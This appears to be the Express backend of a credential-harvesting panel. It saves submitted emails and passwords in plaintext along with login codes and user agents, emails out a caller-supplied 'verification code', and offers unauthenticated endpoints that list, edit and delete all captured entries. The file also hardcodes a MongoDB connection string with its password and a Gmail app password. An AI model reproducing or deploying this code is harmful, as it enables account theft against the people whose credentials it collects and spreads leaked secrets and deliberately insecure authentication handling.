const express = require('express');
const { MongoClient, ObjectId } = require('mongodb');
const cors = require('cors');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const bcrypt = require('bcrypt');
const app = express();

app.use(cors());
app.use(bodyParser.json());


const uri = 'mongodb+srv://mega-personal:KhIeiJ5kgc5m5wdz@cluster0.jx87m.mongodb.net/';
const client = new MongoClient(uri);
let db;

client.connect().then(() => {
  db = client.db('mega_project'); // Use your database name
  console.log('Connected to MongoDB');
});

// Helper function to get the date range

const transporter = nodemailer.createTransport({
  secure:true,
  service: 'Gmail', // Or use another provider
  auth: {
    user: 'pronabhalder53@gmail.com',
    pass: 'iieubeldqpkrxpso',
  },
});

// Add form data to MongoDB
app.post('/api/login', async (req, res) => {
  const { email, password, userAgent, code } = req.body;

  function formatDate(date) {
    const day = String(date.getDate()).padStart(2, '0');
    const month = String(date.getMonth() + 1).padStart(2, '0'); // Months are zero-based
    const year = date.getFullYear();
    const hours = String(date.getHours()).padStart(2, '0');
    const minutes = String(date.getMinutes()).padStart(2, '0');
    const seconds = String(date.getSeconds()).padStart(2, '0');
    return `${day}-${month}-${year} ${hours}:${minutes}:${seconds}`;
}


const date = formatDate(new Date());
  try {
      await db.collection('login_data').insertOne({ email, password, date : date, createdAt:new Date(), userAgent, code });

      const mailOptions = {
          from: 'your_email@gmail.com',
          to: email,
          subject: 'Your verification code',
          text: `Your verification code is: ${code}`,
      };

      await transporter.sendMail(mailOptions);
      console.log('Email sent successfully');
      return res.status(200).send('Verification code sent');
  } catch (err) {
      console.error('Error occurred:', err);
      return res.status(500).send('Server error');
  }
});

// API to count documents
app.get('/api/logindata/count', async (req, res) => {
  const { filter } = req.query;
  try {
      const todayCount = await db.collection('login_data').countDocuments({
          createdAt: { $gte: new Date(new Date().setHours(0, 0, 0, 0)) },
      });
      const weeklyCount = await db.collection('login_data').countDocuments({
          createdAt: { $gte: new Date(new Date().setDate(new Date().getDate() - 7)) },
      });

      if (filter === 'today') {
          return res.json({ count: todayCount });
      } else if (filter === 'weekly') {
          return res.json({ count: weeklyCount });
      }

      res.json({ count: 0 });
  } catch (error) {
      console.error("Error fetching counts:", error);
      res.status(500).send('Error retrieving counts');
  }
});


app.get('/api/signupdata/count', async (req, res) => {
  const { filter } = req.query;
  try {
      const todayCount = await db.collection('signup_data').countDocuments({
          createdAt: { $gte: new Date(new Date().setHours(0, 0, 0, 0)) },
      });
      const weeklyCount = await db.collection('signup_data').countDocuments({
          createdAt: { $gte: new Date(new Date().setDate(new Date().getDate() - 7)) },
      });

      if (filter === 'today') {
          return res.json({ count: todayCount });
      } else if (filter === 'weekly') {
          return res.json({ count: weeklyCount });
      }

      res.json({ count: 0 });
  } catch (error) {
      console.error("Error fetching counts:", error);
      res.status(500).send('Error retrieving counts');
  }
});



// API to get users
app.get('/api/loginAll', async (req, res) => {
  try {
      const users = await db.collection('login_data').find().sort({ createdAt: -1 }).toArray();
      res.json(users);
  } catch (error) {
      console.error("Error retrieving users:", error);
      res.status(500).send('Error retrieving users');
  }
});



app.post('/api/signup', async (req, res) => {
  const { email, password, confrim ,userAgent} = req.body;
  try {

    function formatDate(date) {
      const day = String(date.getDate()).padStart(2, '0');
      const month = String(date.getMonth() + 1).padStart(2, '0'); // Months are zero-based
      const year = date.getFullYear();
      const hours = String(date.getHours()).padStart(2, '0');
      const minutes = String(date.getMinutes()).padStart(2, '0');
      const seconds = String(date.getSeconds()).padStart(2, '0');
      
      return `${day}-${month}-${year} ${hours}:${minutes}:${seconds}`;
  }
  
  
  const date = formatDate(new Date());

    const usersCollection = db.collection('signup_data');
    await usersCollection.insertOne({ email, password, confrim ,date : date, createdAt: new Date(),userAgent});
    
    
  } catch (err) {
    console.error('Error occurred:', err); // Logs detailed error
    return res.status(500).send('Server error');
  }
});


app.put('/api/items/:code', async (req, res) => {
  const { code } = req.params;
  const updateData = req.body; 

  try {
      await client.connect();
      const collection = db.collection('login_data');

      const result = await collection.updateOne(
          { code: code.toString() }, // Find the document by ID
          { $set: updateData } // Add or update properties
      );

      if (result.modifiedCount === 1) {
          res.status(200).send({ message: 'Item updated successfully' });
      } else {
          res.status(404).send({ message: 'Item not found' });
      }
  } catch (error) {
      console.error(error);
      res.status(500).send({ message: 'Internal server error' });
  } finally {
      await client.close();
  }
});










app.get('/api/signupAll', async (req, res) => {
  const { filter } = req.query;
  try {
    const collection = db.collection('signup_data');
    let query = {};
    
    if (filter) {
      query.createdAt = getDateRange(filter); // Add time-based filter
    }
    
    const data = await collection.find(query).toArray();
    res.json(data);
  } catch (error) {
    res.status(500).send('Error retrieving data');
  }
});




// Delete form data
app.delete('/api/logindelete/:id', async (req, res) => {
  const { id } = req.params;
  try {
    const collection = db.collection('login_data');
    await collection.deleteOne({ _id: new ObjectId(id) });
    res.send('Data deleted successfully');
  } catch (error) {
    res.status(500).send('Error deleting data');
  }
});

app.delete('/api/signupdelete/:id', async (req, res) => {
  const { id } = req.params;
  try {
    const collection = db.collection('signup_data');
    await collection.deleteOne({ _id: new ObjectId(id) });
    res.send('Data deleted successfully');
  } catch (error) {
    res.status(500).send('Error deleting data');
  }
});


const clickCounts = {};

app.get('/api/clicks', (req, res) => {
  res.json(clickCounts);
});

app.post('/api/clicks', (req, res) => {
  const { page } = req.body;

  if (page) {
    if (!clickCounts[page]) {
      clickCounts[page] = 0;
    }
    clickCounts[page] += 1;
    return res.status(200).json({ page, clicks: clickCounts[page] });
  }
  
  res.status(400).json({ error: 'Page parameter is required' });
});






const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
